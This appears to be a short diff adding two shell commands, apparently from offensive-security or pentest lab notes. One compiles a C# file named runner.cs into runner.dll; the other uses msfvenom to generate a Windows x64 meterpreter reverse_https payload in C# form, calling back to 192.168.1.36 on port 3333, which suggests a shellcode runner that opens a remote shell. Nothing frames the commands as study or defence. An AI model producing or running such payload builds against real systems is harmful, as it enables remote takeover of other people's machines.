@@ -1,0 +1,4 @@
+sudo csc /target:library /out:runner.dll runner.cs 
+
+
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.36 LPORT=3333 -f csharp 
